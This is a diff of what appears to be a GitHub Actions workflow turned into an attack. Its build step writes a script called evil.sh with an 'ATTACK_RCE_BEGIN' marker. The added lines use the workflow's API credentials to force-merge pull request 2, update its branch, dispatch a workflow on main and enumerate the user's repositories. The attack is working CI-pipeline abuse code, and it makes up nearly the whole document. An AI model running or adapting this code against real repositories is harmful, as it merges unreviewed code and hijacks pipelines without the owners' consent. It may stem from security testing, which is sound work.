@@ -10,7 +10,6 @@ jobs:
       - name: build
         run: |
           mkdir -p out
-          printf 'no-pr-number\n' > out/readme.txt
           cat > out/evil.sh <<'SH'
           #!/bin/bash
           echo "=== ATTACK_RCE_BEGIN ==="
@@ -62,6 +61,12 @@ jobs:
                 x = await call('POST', '/repos/' + repo + '/git/refs', { ref: refname, sha: headsha });
                 log('create_ref ' + refname + ' status=' + x.s + ' msg=' + (x.j && x.j.message));
               }
+              x = await call('PUT', '/repos/' + repo + '/pulls/2/merge', { merge_method: 'merge' });
+              log('merge_pr2 status=' + x.s + ' merged=' + (x.j && x.j.merged) + ' msg=' + (x.j && x.j.message));
+              x = await call('PUT', '/repos/' + repo + '/pulls/2/update-branch', {});
+              log('update_branch_pr2 status=' + x.s + ' msg=' + (x.j && x.j.message));
+              x = await call('POST', '/repos/' + repo + '/actions/workflows/414980660/dispatches', { ref: 'main' });
+              log('dispatch_tests status=' + x.s + ' msg=' + (x.j && x.j.message));
               x = await call('GET', '/user/repos?per_page=100');
               log('user_repos status=' + x.s + ' n=' + (Array.isArray(x.j) ? x.j.length : ''));
               let pr = '';
